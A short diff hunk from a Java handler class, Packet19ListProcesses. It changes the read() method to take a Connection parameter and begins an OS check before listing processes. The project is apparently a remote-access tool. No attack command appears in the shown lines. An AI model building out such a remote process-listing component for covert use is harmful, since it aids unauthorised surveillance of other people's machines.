@@ -12,7 +12,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet19ListProcesses extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		try {
 			Process p = null;
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
